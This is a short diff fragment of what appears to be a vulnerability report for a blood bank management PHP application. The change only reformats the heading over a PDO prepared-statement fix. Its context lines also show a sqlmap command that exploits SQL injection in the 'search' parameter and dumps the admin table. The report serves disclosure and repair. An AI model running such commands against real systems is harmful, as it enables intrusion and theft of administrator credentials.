@@ -17,7 +17,7 @@ Submitter: Hu Tianjia
 ```bash
 python sqlmap.py -u "http://127.0.0.1/bloodbank/BBfile/bbms.php" --data "search=A&search2=NY" -p search --batch -D bloodbank_db -T admin --dump
 
-Official Repair Solution
+## Official Repair Solution
 Use PDO prepared parameterized statements to completely block SQL injection:
 
 $searchq = $_POST['search'];
